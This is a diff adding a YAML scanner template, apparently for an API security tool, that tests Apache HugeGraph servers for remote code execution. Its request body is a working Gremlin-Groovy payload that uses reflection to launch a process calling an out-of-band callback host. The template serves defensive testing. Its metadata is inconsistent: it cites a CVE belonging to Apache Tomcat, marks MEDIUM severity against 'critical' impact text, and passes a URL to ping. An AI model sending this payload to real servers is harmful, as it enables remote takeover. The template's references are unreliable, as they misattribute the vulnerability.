@@ -1,0 +1,49 @@
+id: APACHE_HUGEGRAPH_SERVER_RCE
+info:
+  name: "Apache HugeGraph Server Remote Code Execution Test"
+  description: "The Apache HugeGraph Server Remote Code Execution (RCE) Test identifies vulnerabilities in the HugeGraph server that could allow an attacker to remotely execute arbitrary code on the server. This vulnerability may occur when user inputs are improperly validated or sanitized, allowing malicious code to be injected and executed. If exploited, an attacker could gain control over the server, compromise sensitive data, or disrupt service. Securing input validation and implementing proper access controls are critical to prevent RCE risks in Apache HugeGraph."
+  details:  "The Apache HugeGraph Server Remote Code Execution (RCE) Test examines potential flaws where user-controlled data can trigger the execution of arbitrary code on the HugeGraph server. If input is improperly handled, an attacker could inject malicious code, such as through API requests or configuration files, which would then be executed by the server. This could lead to full control over the server, enabling unauthorized access to sensitive data, system manipulation, or even complete server compromise. To mitigate this, Apache HugeGraph should sanitize all user inputs, limit execution permissions, and regularly patch security vulnerabilities."
+  impact: "The impact of an Apache HugeGraph Server Remote Code Execution (RCE) vulnerability is critical, as it allows attackers to execute arbitrary code on the server, potentially gaining full control over the system. This could lead to unauthorized access to sensitive data, data manipulation, or even a complete server compromise. Exploiting this vulnerability may also allow attackers to disrupt service or launch further attacks within the network. To prevent these risks, input validation, strict access controls, and regular security updates are essential."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: APACHE_HUGEGRAPH_SERVER_RCE
+  severity: MEDIUM
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2020-9484
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+
+execute:
+  type: single
+  requests:
+    - req:
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - modify_url: "/gremlin"
+      - modify_method: POST
+      - replace_body: '{"gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"ping\", \"https://test-services.akto.io/${random_uuid}\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);", "bindings": {}, "language": "gremlin-groovy", "aliases": {}}'
+validate:
+  ssrf_url_hit: ${random_uuid}
+  response_headers:
+    for_one:
+      key:
+        eq: content-type
+      value:
+        eq: "application/json"
+  response_payload:
+    contains_either: "inputStream"
+
